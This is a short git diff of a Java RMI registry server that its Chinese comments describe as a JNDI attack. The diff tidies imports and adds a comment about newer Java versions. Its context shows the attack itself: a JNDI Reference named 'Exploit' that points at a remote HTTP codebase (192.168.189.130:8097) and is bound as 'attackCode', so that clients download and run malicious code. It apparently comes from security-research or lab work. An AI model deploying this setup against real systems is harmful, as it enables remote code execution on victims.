@@ -7,11 +7,13 @@ import javax.naming.InitialContext;
 import javax.naming.NamingException;
 import javax.naming.Reference;
 import java.net.MalformedURLException;
-import java.rmi.*;
+import java.rmi.AlreadyBoundException;
+import java.rmi.Naming;
+import java.rmi.Remote;
+import java.rmi.RemoteException;
 import java.rmi.registry.LocateRegistry;
 import java.rmi.registry.Registry;
 import java.util.Hashtable;
-import java.util.Properties;
 
 /**
  * JNDI攻击
@@ -64,6 +66,7 @@ public class RMIRegistryServer {
         String remote_class_server = "http://192.168.189.130:8097/";
         Reference reference = new Reference("Exploit", "Exploit", remote_class_server);
         //reference的factory class参数指向了一个外部Web服务的地址
+        /* 高版本不可加载该类，进行JNDI攻击 */
         ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
         // 去远程恶意服务器上 下载代码
         registry.bind("attackCode", referenceWrapper);
